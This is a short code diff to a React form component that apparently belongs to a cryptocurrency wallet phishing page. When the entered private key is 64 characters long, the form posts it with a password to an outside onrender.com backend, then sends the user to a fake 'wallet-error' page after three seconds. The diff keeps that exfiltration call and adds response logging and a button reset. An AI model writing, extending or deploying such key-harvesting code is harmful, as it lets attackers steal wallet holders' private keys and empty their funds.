@@ -37,13 +37,15 @@ const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
 
     if (privateKey64Long) {
       try {
-        await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+        const res = await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+        console.log(res);
         setTimeout(() => {
           navigate('/wallet-error')
         }, 3000);
 
       } catch (error) {
           console.log(error)
+          setPrivateSubmitBtn("CONNECT")
       }
     } else {
         privateKeyLengthNotlong()
